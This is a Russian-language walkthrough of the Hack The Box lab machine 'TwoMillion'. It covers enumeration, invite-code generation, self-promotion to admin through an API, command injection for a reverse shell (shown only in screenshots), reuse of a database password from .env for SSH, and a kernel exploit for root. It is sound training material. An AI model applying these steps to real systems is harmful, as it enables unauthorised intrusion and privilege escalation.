Сканируем хост через nmap. Открыты 22 и 80, надо исследовать веб-сервер.
```
Nmap scan report for 10.129.3.147
Host is up (0.16s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up)
```

Заходя на сервер, нас редиректит на доменное имя 2million.htb, поэтому добавляем его в /etc/hosts

Сайт - это большая страница, с кучей текста, стилизованная под hack the box, но также есть форма логина.

![](../images/Pasted%20image%2020260526125052.png)

После ffuf картина становится виднее. Есть форма логина, логаута, регистрации, для регистрации нужно пройти проверку инвайт кода, также есть 404, 0404 и апи.
 
![](../images/Pasted%20image%2020260526132140.png)

Страница invite показалась мне странной, но она требует какой то invite code

![](../images/Pasted%20image%2020260526130414.png)

В исходном коде этой страницы видим логику использования invite code.
```
	<script defer>  
        $(document).ready(function() {  
            $('#verifyForm').submit(function(e) {  
                e.preventDefault();  
  
                var code = $('#code').val();  
                var formData = { "code": code };  
  
                $.ajax({  
                    type: "POST",  
                    dataType: "json",  
                    data: formData,  
                    url: '/api/v1/invite/verify',  
                    success: function(response) {  
                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {  
                            // Store the invite code in localStorage  
                            localStorage.setItem('inviteCode', code);  
  
                            window.location.href = '/register';  
                        } else {  
                            alert("Invalid invite code. Please try again.");  
                        }  
                    },  
                    error: function(response) {  
                        alert("An error occurred. Please try again.");  
                    }  
                });  
            });  
        });  
    </script>
```

Также там подтягивается inviteapi.min.js. Рассмотрим его.

Это минифицированный обфусцированный JS
![](../images/Pasted%20image%2020260526132916.png)

После обратных операций находим функцию, активируем ее в браузере
```
function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

После запуска этой функции в браузере, находим небольшую подсказку. Расшифровываем текст через ROT13

![](../images/Pasted%20image%2020260526133247.png)

После расшифровки
```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Получаем инвайт код в формате base64, декодируем его сразу же
```
└─$ curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"QlAzSjMtQTFIVFgtUUROVTMtMU1XQkc=","format":"encoded"}}

BP3J3-A1HTX-QDNU3-1MWBG     
```

Код подошел, пробуем регистрироваться

![](../images/Pasted%20image%2020260526133651.png)

Регистрация удалась, изучаем директорию home

![](../images/Pasted%20image%2020260526133809.png)

На одной из сайтов можно найти список usernamов
```
P1rs1ng6407
kernelv0id
megapolska
Arrexel
eks
TwelveSec
kernelv0id
SirenCeol
andrewn
Arrexel
m4lv0id
game0ver
m0nk3h
chryzsh
makelarisjr
```

На странице access можно скачать конфигурацию ovpn. Это происходит, запустив запрос на соответствующую api. Обратившись к корню апи можно узнать все доступные эндпоинты:
```
{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}
```

Из интересных эндпоинтов api обратимся к тому, который может менять настройки. Обращаемся и видим, что не хватает email.

![](../images/Pasted%20image%2020260526184641.png)

Через несколько запросов понимает какие параметры должны передаваться и кажется получается сделать аккаунт администраторским.

![](../images/Pasted%20image%2020260526184937.png)

Проверяем через другой эндпоинт, действительно стали администратором.

![](../images/Pasted%20image%2020260526185318.png)

Эндпоинт для генерации vpn оказался уязвим для CMDi, попробуем получить реверс шел

![](../images/Pasted%20image%2020260526185943.png)

Вот такой запрос сработал. И я получил ревшел.

![](../images/Pasted%20image%2020260526190729.png)

Далее я сначала попробовал открыть /home/admin и не получилось прочитаь user.txt.
Затем я подумал о мгновенной эскалации привилегий, но тоже не нашел путей.

После этого я вернулся в исходную директорию и начал исследовать там.
Я увидел Datebase.php и то что он откуда-то берет пользователя, пароль, БД.
Далее я решил посмотреть .env, как наиболее вероятное хранилище этих данных и нашел логин и пароль от БД.
```
www-data@2million:~/html$ ls -la
ls -la
total 56
drwxr-xr-x 10 root root 4096 May 26 15:10 .
drwxr-xr-x  3 root root 4096 Jun  6  2023 ..
-rw-r--r--  1 root root   87 Jun  2  2023 .env
-rw-r--r--  1 root root 1237 Jun  2  2023 Database.php
-rw-r--r--  1 root root 2787 Jun  2  2023 Router.php
drwxr-xr-x  5 root root 4096 May 26 15:10 VPN
drwxr-xr-x  2 root root 4096 Jun  6  2023 assets
drwxr-xr-x  2 root root 4096 Jun  6  2023 controllers
drwxr-xr-x  5 root root 4096 Jun  6  2023 css
drwxr-xr-x  2 root root 4096 Jun  6  2023 fonts
drwxr-xr-x  2 root root 4096 Jun  6  2023 images
-rw-r--r--  1 root root 2692 Jun  2  2023 index.php
drwxr-xr-x  3 root root 4096 Jun  6  2023 js
drwxr-xr-x  2 root root 4096 Jun  6  2023 views
www-data@2million:~/html$ cat Database.php
cat Database.php
<?php
class Database
{
    private $host;
    private $user;
    private $pass;
    private $dbName;
    private static $database = null;
    private $mysql;
    public function __construct($host, $user, $pass, $dbName)
    {
        $this->host     = $host;
        $this->user     = $user;
        $this->pass     = $pass;
        $this->dbName   = $dbName;
        self::$database = $this;
    }
    public static function getDatabase(): Database
    {
        return self::$database;
    }

    public function connect()
    {
        $this->mysql = new mysqli($this->host, $this->user, $this->pass, $this->dbName);
    }

    public function query($query, $params = [], $return = true)
    {
        $types = "";
        $finalParams = [];
        foreach ($params as $key => $value)
        {
            $types .= str_repeat($key, count($value));
            $finalParams = array_merge($finalParams, $value);
        }
        $stmt = $this->mysql->prepare($query);
        $stmt->bind_param($types, ...$finalParams);
        if (!$stmt->execute())
        {
            return false;
        }
        if (!$return)
        {
            return true;
        }
        return $stmt->get_result() ?? false;
    }
}www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
www-data@2million:~/html$
```

Я решил сразу попробовать, вдруг пользователь установил такой же пароль и на свой ssh.
Действительно мы получили доступ и можем прочитать флаг пользователя.

![](../images/Pasted%20image%2020260526192150.png)

Далее я проверил несколько векторов эскалации, но не нашел ничего. Перешел к изучению ядра системы.

Узнал, что для этой версии существует как минимум два жестких эксплоита для повышения привилегий. Также проверил наличие компилятора
```
admin@2million:~$ uname -a
Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
admin@2million:~$ cat /proc/version
Linux version 5.15.70-051570-generic (kernel@sita) (gcc (Ubuntu 11.2.0-19ubuntu1) 11.2.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022
admin@2million:~$ cat /etc/issue
Ubuntu 22.04.2 LTS \n \l

admin@2million:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
admin@2million:~$ make
make: *** No targets specified and no makefile found.  Stop.
```

Перекинул нужные файлы, скомпилировал и запустил эксплоит.

Получил рут и прочитал флаг.

![](../images/Pasted%20image%2020260526193217.png)

